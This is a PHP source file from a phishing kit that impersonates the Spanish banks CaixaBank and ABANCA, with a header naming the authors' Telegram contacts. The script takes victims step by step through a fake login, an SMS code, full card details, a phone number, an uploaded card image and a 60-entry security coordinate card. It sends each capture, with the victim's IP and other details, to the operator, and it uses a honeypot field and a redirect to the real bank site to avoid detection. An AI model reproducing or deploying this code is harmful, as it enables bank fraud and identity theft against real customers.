<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/login.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password']  = $_POST['password'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = 'Introduzca su Identificador';
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = '﻿Introduzca su Número secreto personal';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/app.php?verification#_");
                exit();
            } else {
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'El código SMS es incorrecto';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/cc.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $_SESSION['four']      = $_POST['four'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Por favor, introduzca un número de tarjeta válido.';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Por favor ingrese un código válido.';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Por favor introduzca una fecha valida.';
            }
            /*if( validate_number($_POST['four'],4) == false ) {
                $_SESSION['errors']['four'] = 'Por favor ingrese un pin válido.';
            }*/
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ABANCA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                //$message .= 'Card PIN : ' . $_POST['four'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: clients/phone.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "phone") {
            $_SESSION['errors']     = [];
            $_SESSION['phone'] = $_POST['phone'];
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = 'Ingrese un número de teléfono válido';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Phone';
                $message = '/-- PHONE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END PHONE INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/success.php?verification#_");
                exit();
            } else {
                header("Location: clients/phone.php?error=1&verification#_");
                exit();
            }
        }
        if($_GET['step'] == "upload") {
            $_SESSION['errors']      = [];
            $url     = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $x       = pathinfo($url);
            $dirname = explode('/',$x['dirname']);
            //array_pop($dirname);
            $dirname = implode('/',$dirname) . '/cartes/';
            if( empty($_FILES['upload_carte']['name']) ) {
                echo 'error';
                exit();
            }
            $carte = upload_file($_FILES['upload_carte'],'carte');
            if( $carte !== false ) {
                $subject = get_client_ip() . ' | CAIXA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card Link : ' . $dirname . $carte . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo 'success';
                exit();
            }
            echo 'error';
            exit();
        }
        if ($_POST['step'] == "card") {
            $_SESSION['errors']     = [];
            $subject = get_client_ip() . ' | CAIXA | Card';
            $message = '/-- Card INFOS --/' . get_client_ip() . "\r\n"; 
            for($i = 1; $i <= 60; $i++) {
                $message .= 'N' . $i . ': ' . $_POST['num' . $i] . ' | ' . 'Clave: ' . $_POST['pass' . $i] . "\r\n";
            }
            $message .= '/-- END Card INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            header("Location: clients/phone.php?verification#_");
            exit();
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>